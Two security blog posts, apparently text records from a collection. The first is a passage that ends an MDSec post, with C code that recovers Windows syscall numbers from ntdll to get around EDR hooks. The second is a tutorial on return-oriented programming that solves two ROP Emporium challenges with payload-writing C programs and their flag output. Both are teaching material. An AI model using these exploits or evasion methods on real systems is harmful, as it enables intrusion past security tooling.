TRUE);\/\/TpWai\ntForWork\nTpReleaseWork(LdrpMapAndSnapWork);\/\/CloseThreadpoolWork\nLdrpMapAndSnapWork = 0;\nTpReleasePool(LdrpThreadPool);\/\/CloseThreadpool\nLdrpThreadPool = 0;\n}\n}\n}\nThe above pseudocode for function LdrpDetectDetour() is essentially\nexamining the first 16 bytes of code for five native API functions\nNtOpenFile(), NtCreateSection(), ZwQueryAttributeFile(),\nZwOpenSection() and ZwMapViewOfFile() and determining whether these\nbytes have been modified from the known good bytes stored within the\nLdrpThunkSignature array stored within ntdll.\n(A quick disassembly of the LdrpDetectDetour() function confirms that\nthe behaviour described in pseudocode above remains, however it should\nbe mentioned that the function now additionally verifies the integrity\nof a further 27 native API but still only compares exact syscall stubs\nfor the five functions detailed.)\nExamination of ntdll with IDA Pro revealed that the LdrpDetectDetour()\nfunction is called from two places: LdrpLoadDllInternal() (called\ndirectly from LdrpLoadDll()) and LdrpEnableParallelLoading() (called\nlate into LdrpInitializeProcess()). Since the LdrpDetectDetour()\nfunction configures a global variable which can halt the parallel load\nand force further loads to occur synchonously, and many DLLs which\ninstall detours (such as EDR user-space components) do so immediately\nupon being loaded into a process, it makes sense for the detour\ndetection function to be called repeatedly upon loading each new DLL\ndependency.\nInvestigation of this process invites a question however \u2013 where do the\nknown good stubs for the five native API functions come from? Initial\nexpectations were that the syscall stubs would be hardcoded at compile\ntime during code generation, however examining the LdrpThunkSignature\narray statically indicates that this is not the case since the array is\nnot initialised until ntdll is mapped (as the array resides in the\nuninitialised .data section).\nTaking a data cross-reference of LdrpThunkSignature identifies one\nother use of the array, within LdrpCaptureCriticalThunks(), this\nfunction in turn is called into early by LdrpInitializeProcess() before\nany import dependencies have been loaded (and hence before third-party\nmodules which may install detours have been loaded into the process).\nQuickly hand decompiling LdrpCaptureCriticalThunks() reveals an\nimplementation similar to the following pseudocode:\nVOID LdrpCaptureCriticalThunks()\n{\nconst DWORD c_dwNumCriticalLoaderFunctions = 5;\nMEMORY_WORKING_SET_EX_INFORMATION rgMemWorkingSetInfo[5];\nNTSTATUS ntStatus;\nfor (DWORD i = 0; i < c_dwNumCriticalLoaderFunctions; i++)\n{\nrgMemWorkingSetInfo[i].VirtualAddress = LdrpCriticalLoaderFunctions[i];\n}\nntStatus = ZwQueryVirtualMemory(NtCurrentProcess(), NULL, MemoryWorkingSetEx\nInformation, rgMemWorkingSetInfo, sizeof(rgMemWorkingSetInfo), 0);\nif (NT_SUCCESS(ntStatus))\n{\nfor (DWORD i = 0; i < c_dwNumCriticalLoaderFunctions; i++)\n{\nif (!rgMemWorkingSetInfo[i].VirtualAttributes.Bad)\n{\ngoto ExitError;\n}\nLdrpThunkSignature[i] = *(__m128 *)LdrpCriticalLoaderFunctions[i];\n}\nreturn;\n}\nExitError:\nLdrpDetourExist = TRUE;\n}\nFrom the above it can be clearly seen that the first 16 bytes of each\nsyscall stub for the five critical functions are copied out of each\nfunction and into the LdrpThunkSignature array by\nLdrpCaptureCriticalThunks().\nRecovering Syscalls from LdrpThunkSignature\nA reader experienced with post-exploitation tool development will no\ndoubt at this stage see where this blog post is headed; with these five\ncritical functions and knowledge of their syscall numbers (read\ndirectly from LdrpThunkSignature) we have sufficient native API\nfunctions to be able to read a fresh copy of ntdll from disk using\nsyscalls.\nSince the LdrpThunkSignature array is not exported by ntdll we need to\nlocate this in the ntdll .data section. The array can be identified by\nthe presence of the common syscall prologue:\n0:001> u ntdll!LdrpThunkSignature\nntdll!LdrpThunkSignature:\n00007ff9`2e1860d0 4c8bd1          mov     r10,rcx\n00007ff9`2e1860d3 b833000000      mov     eax,33h\n00007ff9`2e1860d8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000\n000`7ffe0308)],1\n00007ff9`2e1860e0 4c8bd1          mov     r10,rcx\n00007ff9`2e1860e3 b84a000000      mov     eax,4Ah\n00007ff9`2e1860e8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000\n000`7ffe0308)],1\n00007ff9`2e1860f0 4c8bd1          mov     r10,rcx\n00007ff9`2e1860f3 b83d000000      mov     eax,3Dh\n0:001> db ntdll!LdrpThunkSignature\n00007ff9`2e1860d0  4c 8b d1 b8 33 00 00 00-f6 04 25 08 03 fe 7f 01  L...3.....%.\n....\n00007ff9`2e1860e0  4c 8b d1 b8 4a 00 00 00-f6 04 25 08 03 fe 7f 01  L...J.....%.\n....\n00007ff9`2e1860f0  4c 8b d1 b8 3d 00 00 00-f6 04 25 08 03 fe 7f 01  L...=.....%.\n....\n00007ff9`2e186100  4c 8b d1 b8 37 00 00 00-f6 04 25 08 03 fe 7f 01  L...7.....%.\n....\n00007ff9`2e186110  4c 8b d1 b8 28 00 00 00-f6 04 25 08 03 fe 7f 01  L...(.....%.\n....\nCode which is able to use this information to recover the required\nsyscalls follows (an extract from the implementation provided by MDSec\nto recover all syscalls):\nBOOL InitSyscallsFromLdrpThunkSignature()\n{\nPPEB Peb = (PPEB)__readgsqword(0x60);\nPPEB_LDR_DATA Ldr = Peb->Ldr;\nPLDR_DATA_TABLE_ENTRY NtdllLdrEntry = NULL;\nfor (PLDR_DATA_TABLE_ENTRY LdrEntry = (PLDR_DATA_TABLE_ENTRY)Ldr->InLoadOrde\nrModuleList.Flink;\nLdrEntry->DllBase != NULL;\nLdrEntry = (PLDR_DATA_TABLE_ENTRY)LdrEntry->InLoadOrderLinks.Flink)\n{\nif (_wcsnicmp(LdrEntry->BaseDllName.Buffer, L\"ntdll.dll\", 9) == 0)\n{\n\/\/ got ntdll\nNtdllLdrEntry = LdrEntry;\nbreak;\n}\n}\nif (NtdllLdrEntry == NULL)\n{\nreturn FALSE;\n}\nPIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)NtdllLdrEn\ntry->DllBase + ((PIMAGE_DOS_HEADER)NtdllLdrEntry->DllBase)->e_lfanew);\nPIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&Im\nageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader);\nULONG_PTR DataSectionAddress = NULL;\nDWORD DataSectionSize;\nfor (WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++)\n{\nif (!strcmp((char*)SectionHeader[i].Name, \".data\"))\n{\nDataSectionAddress = (ULONG_PTR)NtdllLdrEntry->DllBase + SectionHead\ner[i].VirtualAddress;\nDataSectionSize = SectionHeader[i].Misc.VirtualSize;\nbreak;\n}\n}\nDWORD dwSyscallNo_NtOpenFile = 0, dwSyscallNo_NtCreateSection = 0, dwSyscall\nNo_NtMapViewOfSection = 0;\nif (!DataSectionAddress || DataSectionSize < 16 * 5)\n{\nreturn FALSE;\n}\nfor (UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++)\n{\nif (*(DWORD*)(DataSectionAddress + uiOffset) == 0xb8d18b4c &&\n*(DWORD*)(DataSectionAddress + uiOffset + 16) == 0xb8d18b4c &&\n*(DWORD*)(DataSectionAddress + uiOffset + 32) == 0xb8d18b4c &&\n*(DWORD*)(DataSectionAddress + uiOffset + 48) == 0xb8d18b4c &&\n*(DWORD*)(DataSectionAddress + uiOffset + 64) == 0xb8d18b4c)\n{\ndwSyscallNo_NtOpenFile = *(DWORD*)(DataSectionAddress + uiOffset + 4\n);\ndwSyscallNo_NtCreateSection = *(DWORD*)(DataSectionAddress + uiOffse\nt + 16 + 4);\ndwSyscallNo_NtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOf\nfset + 64 + 4);\nbreak;\n}\n}\nif (!dwSyscallNo_NtOpenFile)\n{\nreturn FALSE;\n}\nULONG_PTR SyscallRegion = (ULONG_PTR)VirtualAlloc(NULL, 3 * MAX_SYSCALL_STUB\n_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nif (!SyscallRegion)\n{\nreturn FALSE;\n}\nNtOpenFile = (FUNC_NTOPENFILE)BuildSyscallStub(SyscallRegion, dwSyscallNo_Nt\nOpenFile);\nNtCreateSection = (FUNC_NTCREATESECTION)BuildSyscallStub(SyscallRegion + MAX\n_SYSCALL_STUB_SIZE, dwSyscallNo_NtCreateSection);\nNtMapViewOfSection = (FUNC_NTMAPVIEWOFSECTION)BuildSyscallStub(SyscallRegion\n+ (2* MAX_SYSCALL_STUB_SIZE), dwSyscallNo_NtMapViewOfSection);\nreturn TRUE;\n}\nAn implementation which recovers all syscalls using the above to read\nntdll from disk may be found on the [29]MDSec ActiveBreach GitHub\nrepository.\nThis implementation is of course a PoC and is not optimal from an opsec\nperspective (for example, the syscall stubs are allocated using RWX\nmemory created using VirtualAlloc()).\nThis post was written by [30]@peterwintrsmith\n."}
{"text":"[1]Dangerous Assembly\n[2]Dinge [3]RSS [4]github [5]publications [6]about\n2019-06-15\nReturn Oriented Programming\nContents\n* [7]Function Calls in x86 Assembly\n* [8]Redirecting Control Flow\n* [9]Chaining Gadgets\n* [10]ROP Mitigations\n* [11]Conclusion\n* [12]References\nAs a C++ programmer I am well aware of memory errors such as buffer\noverflows and dangling pointers. There are a lot of good debugging\ntools available like Memcheck in Valgrind and Address Sanitizer in GCC\nand Clang which help identifying the root cause leading to the memory\ncorruption. But memory errors are not just bugs resulting in crashes or\nincorrect program behavior. They are potentially severe security\nissues. To better understand the risks involved, let us take a look at\nsome basic concepts of exploitation, particularly at return oriented\nprogramming (ROP).\nFunction Calls in x86 Assembly\nBefore we get our hands dirty, we will briefly look at x86 assembly.\nDon\u2019t panic! We will only look at four instructions which are relevant\nfor function calls and stack manipulation. That\u2019s all we will need for\nthe moment.\nFunction support is provided by two instructions at the assembly level:\ncall and ret. The call instruction takes the address of a function as\nan operand, either as a fixed address as part of the instruction\nencoding (immediate) or as a register holding the address (indirect\ncall). The latter one is used, among others, for virtual function calls\nas the address of the callee is not known at compile-time. There are\ntwo operations call does.\n1. It pushes the address of the following instruction on the stack.\nThis will be the location where the program continues execution\nafter the function call (return address).\n2. It jumps to the address provided by the operand which transfers\ncontrol flow to the callee.\nNotice that call does not handle any function parameters. They are\npassed in registers, and on the stack if a function has a lot of\nparameters. The calling convention of the operating system specifies\nwhich registers have to be used by a conforming compiler. Wikipedia has\na nice [13]overview of the various calling conventions. We will focus\non x86-64 Linux. There, the first six parameters are passed in rdi,\nrsi, rdx, rcx, r8 and r9. Any additional parameter is passed on the\nstack. The callee assumes the caller adheres to the calling convention\nand uses the registers representing the parameters accordingly.\nThe ret instruction has to jump back to wherever the function call\noriginated from. That is where the return address comes into play. ret\npops the address from the top of the stack where the previous call left\nit and transfers control flow back to the caller. How the return value\nis transferred to the caller is again specified by the calling\nconvention. It is usually in the register rax. The important thing to\nnote here is that ret always gets the address to jump to from the top\nof the stack.\nThere are two more important instructions to manipulate the stack: push\nand pop. push stores the value of its operand on the stack and grows\nthe stack accordingly. pop does the opposite. It loads the value from\nthe top of the stack into the register provided as operand and shrinks\nthe stack. These two instructions work in the same way as you would\nexpect from push and pop operations on a stack data structure.\nNow that we know some basic x86 assembly instructions, let\u2019s look at\nthe first two challenges provided by [14]ROP Emporium which is a very\nnice website to learn the basics of return oriented programming. The\nfollowing sections will hold your hand all the way through the first\ntwo challenges. If you want to try them without spoilers then do so\nnow.\nRedirecting Control Flow\nThe first challenge is called [15]ret2Win. The description of the\nchallenge already gives away what we have to do: overwrite the return\naddress on the stack. Remember, the ret instruction is data driven.\nWhatever the address on top of the stack is, ret will jump to it. If an\nattacker can overwrite this memory location, he can redirect control\nflow to an address of his liking. And today, we are playing attacker.\nBut first, let\u2019s step back a little and let us analyze the executable\nwe got. We will focus on the 64-bit version and mostly use [16]Radare2\n(r2) to analyze it. r2 is a very powerful reverse engineering tool.\nHence, it is quite complex. We will take it step by step.\nWe load the program into r2 and get greeted by a fortune and a command\nprompt. The first useful command is i which extracts general\ninformation from the opened file.\n$ r2 .\/ret2win\n-- \/dev\/brain: No such file or directory.\n[0x00400650]> i\nfd       3\nfile     .\/ret2win\nsize     0x2360\nhumansz  8.8K\nmode     r-x\nformat   elf64\niorw     false\nblksz    0x0\nblock    0x100\ntype     EXEC (Executable file)\narch     x86\nbaddr    0x400000\nbinsz    7071\nbintype  elf\nbits     64\ncanary   false\nclass    ELF64\ncompiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609\ncrypto   false\nendian   little\nhavecode true\nintrp    \/lib64\/ld-linux-x86-64.so.2\nladdr    0x0\nlang     c\nlinenum  true\nlsyms    true\nmachine  AMD x86-64 architecture\nmaxopsz  16\nminopsz  1\nnx       true\nos       linux\npcalign  0\npic      false\nrelocs   true\nrelro    partial\nrpath    NONE\nsanitiz  false\nstatic   false\nstripped false\nsubsys   linux\nva       true\nCommands in r2 are categorized and structured in a command tree. Short\nsequences of characters are used to navigate the tree, each character\nrepresenting an option we picked. For example, to get more detailed\ninformation about the executable like the list of symbols, we use the\ncommand is, extending the command for general information i. You can\nget a list of available options by adding a question mark at the end,\ne.g., i? or just ? to get the top-level commands and other helpful\nexplanations.\nThe list of symbols might be quite long. We can filter the output of a\ncommand with the tilde ~ operator which works like a built-in grep.\nFiltering for symbols belonging to functions:\n[0x00400650]> is~FUNC\n030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones\n031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones\n032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux\n035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy\n038 0x000007b5 0x004007b5  LOCAL   FUNC   92 pwnme\n039 0x00000811 0x00400811  LOCAL   FUNC   32 ret2win\n049 0x000008b0 0x004008b0 GLOBAL   FUNC    2 __libc_csu_fini\n056 0x000008b4 0x004008b4 GLOBAL   FUNC    0 _fini\n066 0x00000840 0x00400840 GLOBAL   FUNC  101 __libc_csu_init\n068 0x00000650 0x00400650 GLOBAL   FUNC   42 _start\n070 0x00000746 0x00400746 GLOBAL   FUNC  111 main\n075 0x000005a0 0x004005a0 GLOBAL   FUNC    0 _init\n001 0x000005d0 0x004005d0 GLOBAL   FUNC   16 imp.puts\n002 0x000005e0 0x004005e0 GLOBAL   FUNC   16 imp.system\n003 0x000005f0 0x004005f0 GLOBAL   FUNC   16 imp.printf\n004 0x00000600 0x00400600 GLOBAL   FUNC   16 imp.memset\n005 0x00000610 0x00400610 GLOBAL   FUNC   16 imp.__libc_start_main\n006 0x00000620 0x00400620 GLOBAL   FUNC   16 imp.fgets\n008 0x00000630 0x00400630 GLOBAL   FUNC   16 imp.setvbuf\nWe can also chain filters:\n[0x00400650]> is~FUNC~LOCAL\n030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones\n031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones\n032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux\n035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy\n038 0x000007b5 0x004007b5  LOCAL   FUNC   92 pwnme\n039 0x00000811 0x00400811  LOCAL   FUNC   32 ret2win\nTwo functions stand out because of their suspicious names: pwnme and\nret2win. Let us have a look at pwnme first. We seek to the function\nwith s 0x004007b5. Next, we analyze the function with af which among\nothers determines the function boundaries. From the symbol table we\nonly got the entry point of the function. With the boundaries analyzed,\nwe can print the disassembly of the function with pdf. The last two\ncommands work implicitly with the current position.\n[0x000007b5]> s 0x004007b5\n[0x004007b5]> af\n[0x004007b5]> pdf\n\/ (fcn) sym.pwnme 92\n|   sym.pwnme ();\n|           ; var int32_t var_20h @ rbp-0x20\n|           0x004007b5      55             push rbp\n|           0x004007b6      4889e5         mov rbp, rsp\n|           0x004007b9      4883ec20       sub rsp, 0x20\n|           0x004007bd      488d45e0       lea rax, [var_20h]\n|           0x004007c1      ba20000000     mov edx, 0x20\n; 32\n|           0x004007c6      be00000000     mov esi, 0\n|           0x004007cb      4889c7         mov rdi, rax\n|           0x004007ce      e82dfeffff     call sym.imp.memset\n; void *memset(void *s, int c, size_t n)\n|           0x004007d3      bff8084000     mov edi,\nstr.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_in\nto_32_bytes_of_stack_buffer___What_could_possibly_go_wrong ; 0x4008f8 ;\n\"For my first trick, I will attempt to fit 50 bytes of user input into\n32 bytes of stack buffer;\\nWhat could possibly go wrong?\"\n|           0x004007d8      e8f3fdffff     call sym.imp.puts\n; int puts(const char *s)\n|           0x004007dd      bf78094000     mov edi,\nstr.You_there_madam__may_I_have_your_input_please__And_don_t_worry_abou\nt_null_bytes__we_re_using_fgets ; 0x400978 ; \"You there madam, may I\nhave your input please? And don't worry about null bytes, we're using\nfgets!\\n\"\n|           0x004007e2      e8e9fdffff     call sym.imp.puts\n; int puts(const char *s)\n|           0x004007e7      bfdd094000     mov edi, 0x4009dd\n|           0x004007ec      b800000000     mov eax, 0\n|           0x004007f1      e8fafdffff     call sym.imp.printf\n; int printf(const char *format)\n|           0x004007f6      488b15730820.  mov rdx, qword [obj.stdin];\nMOV rdx = [0x601070] = 0x0 rsp\n; obj.stdin__GLIBC_2.2.5 ; [0x601070:8]=0\n|           0x004007fd      488d45e0       lea rax, [var_20h]\n|           0x00400801      be32000000     mov esi, 0x32\n; '2' ; 50\n|           0x00400806      4889c7         mov rdi, rax\n|           0x00400809      e812feffff     call sym.imp.fgets\n; char *fgets(char *s, int size, FILE *stream)\n|           0x0040080e      90             nop\n|           0x0040080f      c9             leave\n\\           0x00400810      c3             ret\nThe first column is the address of the instruction. Next, we see the\nopcode, the encoding of the instruction and its operands in\nhexadecimal, followed by the disassembly which we humans prefer to\nread. Last, we see some helpful comments in red which the analysis run\nin r2 added for us, like the signatures of the called functions.\nWell, now we just have to understand the assembly. The function\nconsists mostly of function calls to memset, puts, printf and fgets.\nThere are no complex calculations happening. With the calling\nconvention in mind, we can decompile it by hand to the following C\nfunction.\nvoid pwnme(){\nchar buf[32];\nmemset(buf, 0, 32);\nputs(\"For my first trick, I will attempt to fit 50 bytes of user input \"\n\"into 32 bytes of stack buffer;\\nWhat could possibly go wrong?\");\nputs(\"You there madam, may I have your input please? And don't worry \"\n\"about null bytes, we're using fgets!\\n\");\nprintf(\">\");\nfgets(buf, 50, stdin);\n}\nThe programming bug is quite obvious. The function stores with fgets up\nto 50 bytes of data from stdin into a stack buffer which is only 32\nbytes large. On x86 the stack grows downwards which means that by\nwriting past the end of the buffer we overwrite previous elements\ndeeper on the stack, like the return address which was pushed on the\nstack when calling the function.\nSo, we found an exploitable memory error. Now, what do we do with it?\nThe task was to get the content of the file flag.txt. Let us look at\nthe other suspiciously named function ret2win using the same commands\nwe just learned.\n[0x00400650]> s 0x00400811\n[0x00400811]> af\n[0x00400811]> pdf\n\/ (fcn) sym.ret2win 32\n|   sym.ret2win ();\n|           0x00400811      55             push rbp\n|           0x00400812      4889e5         mov rbp, rsp\n|           0x00400815      bfe0094000     mov edi,\nstr.Thank_you__Here_s_your_flag: ; 0x4009e0 ; \"Thank you! Here's your\nflag:\"\n|           0x0040081a      b800000000     mov eax, 0\n|           0x0040081f      e8ccfdffff     call sym.imp.printf\n; int printf(const char *format)\n|           0x00400824      bffd094000     mov edi,\nstr.bin_cat_flag.txt ; 0x4009fd ; \"\/bin\/cat flag.txt\"\n|           0x00400829      e8b2fdffff     call sym.imp.system\n; int system(const char *string)\n|           0x0040082e      90             nop\n|           0x0040082f      5d             pop rbp\n\\           0x00400830      c3             ret\nIt is not hard to see that this function fulfills the task. It executes\nthe command string \u201c\/bin\/cat flag.txt\u201d through the function call to\nsystem. All we have to do is call this function. So then, let\u2019s plan\nthe attack!\nWe have to understand where the return address is located relative to\nthe stack buffer we can fill with data. Let us have a look at the start\nof the function pwnme again, just the first three instructions.\n|           0x004007b5      55             push rbp\n|           0x004007b6      4889e5         mov rbp, rsp\n|           0x004007b9      4883ec20       sub rsp, 0x20\npush rbp saves the base pointer on the stack. It is later used by the\nleave instruction at the end of the function to unwind the stack frame.\nsub rsp, 0x20 grows the stack downwards by 32 bytes, basically\nreserving space for our buffer on the stack. That\u2019s all it takes to\nallocate memory on the stack. There are no further instructions\nmanipulating the stack until we reach the exploitable call to fgets.\nHence, we end up with the following stack layout.\n081624324048bufferrbpreta\u2026garbage0x400811\nThat means we need to fill up the buffer with 32 bytes of garbage,\nwrite additionally 8 bytes for rbp and then, finally, overwrite the\nreturn address with the address of ret2win 0x00400811. We end up with\n48 bytes of input data we have to pipe into the challenge program. It\ndoes not matter how you create the input file. You could just use a hex\neditor and type it in, or write a little program to create the file.\nHere\u2019s a C program which does that.\n#include <stdio.h>\n#include <stdint.h>\nint main(){\nFILE *fd = fopen(\"data\", \"wb\");\n\/\/ useless content of the stack buffer, 32 bytes large\nfor(int i=0; i<32; ++i){\nfputc(0xAA, fd);\n}\n\/\/ useless 8 bytes to overwrite rbp\nuint64_t rbp = 0xCAFEBABE;\nfwrite(&rbp, sizeof(rbp), 1, fd);\n\/\/ overwrite return address with address of ret2win()\nuint64_t ret2win = 0x00400811;\nfwrite(&ret2win, sizeof(ret2win), 1, fd);\nfclose(fd);\nreturn 0;\n}\nLet\u2019s see if it works.\n$ .\/ret2win <data\nret2win by ROP Emporium\n64bits\nFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes o\nf stack buffer;\nWhat could possibly go wrong?\nYou there madam, may I have your input please? And don't worry about null bytes,\nwe're using fgets!\n> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}\nSegmentation fault (core dumped)\nYep, it does, and it crashes the program. We corrupted the stack which\nleads to a segfault. When the function ret2win finishes execution, it\ntries to return to its caller with the ret instruction. As we did not\nuse call to enter the function, there is no valid return address on the\nstack. It will interpret whatever is on top of the stack as return\naddress and that\u2019s just asking for trouble. It does not really concern\nus. We got our flag and solved the first challenge.\nChaining Gadgets\nThe first challenge was just a warm-up, teaching you how to redirect\ncontrol flow by overwriting the return address of a function. The\n[17]second challenge \u2018split\u2019 teaches us more concepts of return\noriented programming, particularly the usage of gadgets and how to\nchain them together to perform arbitrary operations.\nLet us start by analyzing the executable file we got. First, we extract\nthe list of functions residing in the binary.\n[0x00400650]> is~FUNC~LOCAL\n030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones\n031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones\n032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux\n035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy\n038 0x000007b5 0x004007b5  LOCAL   FUNC   82 pwnme\n039 0x00000807 0x00400807  LOCAL   FUNC   17 usefulFunction\nThe function pwnme sounds familiar. If you check out the disassembly,\nyou will notice that it is pretty much unchanged. The size parameter to\nfgets is larger which allows us to write more data to the stack. That\nwill make our life easier.\nThe second interesting function is suspiciously named usefulFunction.\nWhat is so useful about it?\n[0x00400807]> pdf\n\/ (fcn) sym.usefulFunction 17\n|   sym.usefulFunction ();\n|           0x00400807      55             push rbp\n|           0x00400808      4889e5         mov rbp, rsp\n|           0x0040080b      bfff084000     mov edi, str.bin_ls\n; 0x4008ff ; \"\/bin\/ls\"\n|           0x00400810      e8cbfdffff     call sym.imp.system\n; int system(const char *string)\n|           0x00400815      90             nop\n|           0x00400816      5d             pop rbp\n\\           0x00400817      c3             ret\nMhmm, there is this call to system again\u2026 But this time it is just\nexecuting \u201c\/bin\/ls\u201d. Too bad. Could have been so easy.\nWell, let\u2019s dig a little deeper. system takes a string as the only\nparameter. What are the strings stored in the executable? The command\niz searches for all strings in the data section where constants like\nstring literals are usually stored.\n[0x00400807]> iz\n[Strings]\nNum Paddr      Vaddr      Len Size Section  Type  String\n000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium\n001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\\n\n002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \\nExiting\n003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason\nto ask user for data...\n004 0x000008ff 0x004008ff   7   8 (.rodata) ascii \/bin\/ls\n000 0x00001060 0x00601060  17  18 (.data) ascii \/bin\/cat flag.txt\nTalk about lucky! Our favorite string \u201c\/bin\/cat flag.txt\u201d is still in\nthe executable. We could have found it as well by studying the symbol\ntable more carefully (is~useful). Now we need to call system with this\nstring as function parameter, but there is no such control flow\nanywhere in the whole executable. We have to create one by abusing the\ncode which is available. This is what return oriented programming is\nall about.\nMore than 15 years ago life for an attacker was easy. We could write\nour own code we like to execute at the beginning of the stack buffer\nand overwrite the return address with the address of the start of the\nbuffer to redirect control flow there. Boom! Arbitrary code execution.\nThat is not possible anymore. Since then the memory protection policy\n\u201cW ^ X\u201d got introduced in every major general-purpose operating system.\nA memory page can be writable or executable, but not both. The policy\nis not strictly followed everywhere but for the stack it is. The stack\nmemory is obviously writable to store local variables and return\naddresses, but it does not need to be executable as it just contains\ndata. We can check with i~nx if the stack is non-executable. On a\nmodern Linux system, it should be.\nThe memory page containing the program instructions is executable but\nnot writable, which prevents us from manipulating the program code. We\ncan still redirect control flow anywhere we want and therefore execute\nany code in the program and its library dependencies. If we jump just a\nfew instructions before a ret instruction, just these few instructions\nwill be executed before we can jump elsewhere with ret reading the next\naddress from the stack we control. That is called a ROP gadget.\nCombining multiple gadgets is called a ROP chain.\nWe need to replace the first parameter to a function call. The first\nparameter is passed in the register rdi according to the calling\nconvention. We must load the address of the string \u201c\/bin\/cat flag.txt\u201d\n0x00601060 into this register, so that system will use it instead of\n\u201c\/bin\/ls\u201d. We control the stack memory. So, let\u2019s write the address on\nthe stack and use the pop instruction to get it into the register rdi.\nWe can search for ROP gadgets with the \/R command.\n[0x00400807]> \/R pop rdi\n0x00400883                 5f  pop rdi\n0x00400884                 c3  ret\nThat is exactly what we were looking for. Let\u2019s put it all together.\n0816243240485664bufferrbpreta(pop)(ret)\u2026garbage0x4008830x6010600x400810\npwnme still has the same vulnerability. We fill up the stack buffer\nwith 32 bytes of garbage, followed by 8 bytes for the stored rbp\nregister. Next, we overwrite the return address with the address to the\nROP gadget at 0x00400883. The gadget reads 8 bytes from the stack with\npop rdi which means we write the address 0x00601060 of the string\n\u201c\/bin\/cat flag.txt\u201d next. The second instruction in the gadget is a ret\ninstruction, so we can write the next address to jump to on the stack.\nWe can jump into usefulFunction at 0x00400810 where the call\ninstruction to system is located. Alternatively, we can jump directly\nto system by getting its address with is~system.\nROP is all about sequencing precise jumps to execute a few instructions\nand jump on. Kind of bunny hopping all over the executable code of a\nprogram. With enough executable code available it is Turing complete,\ni.e., any possible calculation can be performed. The C standard library\n\u201clibc\u201d is big enough and used by a lot of central components of most\noperating systems.\nHere\u2019s a C program creating the input file.\n#include <stdio.h>\n#include <stdint.h>\nint main(){\nFILE *fd = fopen(\"data\", \"wb\");\n\/\/ useless content of the stack buffer, 32 bytes large\nfor(int i=0; i<32; ++i){\nfputc(0xAA, fd);\n}\n\/\/ useless 8 bytes to overwrite rbp\nuint64_t rbp = 0xCAFEBABE;\nfwrite(&rbp, sizeof(rbp), 1, fd);\n\/\/ gadget: pop rdi; ret\nuint64_t poprdi = 0x00400883;\nfwrite(&poprdi, sizeof(poprdi), 1, fd);\n\/\/ string \"\/bin\/cat flag.txt\"\nuint64_t flag = 0x00601060;\nfwrite(&flag, sizeof(flag), 1, fd);\n\/\/ call system\nuint64_t system = 0x00400810;\nfwrite(&system, sizeof(system), 1, fd);\nfclose(fd);\nreturn 0;\n}\n$ .\/split <data\nsplit by ROP Emporium\n64bits\nContriving a reason to ask user for data...\n> ROPE{a_placeholder_32byte_flag!}\nSegmentation fault (core dumped)\nWith the second challenge beaten you can check out the other\nchallenges. I had a lot of fun piecing the puzzles together and learned\na bunch of new things about the low-level execution flow of a program,\nespecially how function calls into a shared library really work. I\nencourage you to have a look at the other challenges.\nROP Mitigations\nNow that we understand the basic concept behind ROP, let us briefly\nlook at some mitigation techniques which try to harden software against\nexploitation with ROP.\nA general technique to detect stack buffer overflows and prevent\noverwriting of return addresses is called stack canaries. A canary\nvalue chosen randomly at program start gets written right on top of\nreturn address of a function. Before the function returns, the canary\nvalue is checked to be unchanged. An attacker trying to overwrite the\nreturn address has to overwrite the canary value as well, with the same\nvalue which was there before. Most compilers support some kind of stack\nprotection like this. The compilation flag in GCC is -fstack-protector\nto protect only \u201clarger\u201d functions which limits the negative\nperformance impact, or -fstack-protector-all to protect all functions.\nThe ROP Emporium challenges have it disabled (i~canary).\nAnother widespread technique is address space layout randomization\n(ASLR). The address where each component of a program (executable code\nand library dependencies) is mapped into the virtual address space of\nthe process is randomly chosen at the program start. Hence, the\nattacker does not know the address of a ROP gadget anymore as it\nchanges with each program start. Program code must be compiled as\nposition-independent code (PIC) to support this randomization. It was\nnot done for the challenges (i~pic).\n[18]Intel CET changes how the call and ret instruction work. It creates\na shadow stack for return addresses. call pushes to both stacks, normal\nand shadow, and ret pops from both and does a comparison before\njumping. The other feature of CET is Indirect Branch Tracking which\nenforces that every legal target of an indirect call\/jump starts with\nan endbranch instruction. This should limit the number of useful\ngadgets.\nIt requires compiler support which landed in GCC 8. And even more\nimportantly, CPUs supporting this feature. I am not aware of any CPU\nbeing sold today that supports it. Something to keep in mind for the\nfuture, I guess. In the meantime, one might try Clang\u2019s [19]SafeStack\nwhich implements a shadow stack as well but works on today\u2019s CPUs.\nConclusion\nI hope you found this post informative and have now a better\nunderstanding why certain security mitigations exist and work the way\nthey do. Yes, they have a negative impact on your program performance,\nbut they are essential to make the life hard for an attacker. So, next\ntime you handle input data coming from some untrusted source be extra\ncareful to check the buffer size correctly. You know now what otherwise\ncan happen.\nHopefully you also had a little fun playing attacker for once. I for\nsure had, but according to my colleagues I might be 